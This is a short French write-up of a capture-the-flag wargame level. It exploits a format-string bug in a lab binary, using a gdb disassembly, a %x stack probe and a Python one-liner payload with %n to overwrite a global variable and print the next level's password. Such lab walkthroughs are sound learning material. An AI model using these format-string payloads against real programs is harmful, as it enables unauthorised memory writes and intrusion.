# Level 4

Ce niveau est très similaire au niveau précédent cependant ici la fonction system fait un `cat` du pass du level5 directement.

En examinant l'asm cette fois-ci `m` doit contenir la valeur `0x1025544` soit `16930116` en décimal mais `fgets` ne prend que `512` charactères.

Mais avec `printf` peut crée un padding de charactère sans pour autant dépassé `512` charactères.

```sh
~ gdb level4
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x080484ad <+6>:	call   0x8048457 <n>
[...]
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
~ ./level4
BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
BBBB b7ff26b0 bffff654 b7fd0ff4 0 0 bffff618 804848d bffff410 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520
~ python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > /tmp/level4
~ cat /tmp/level4 | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

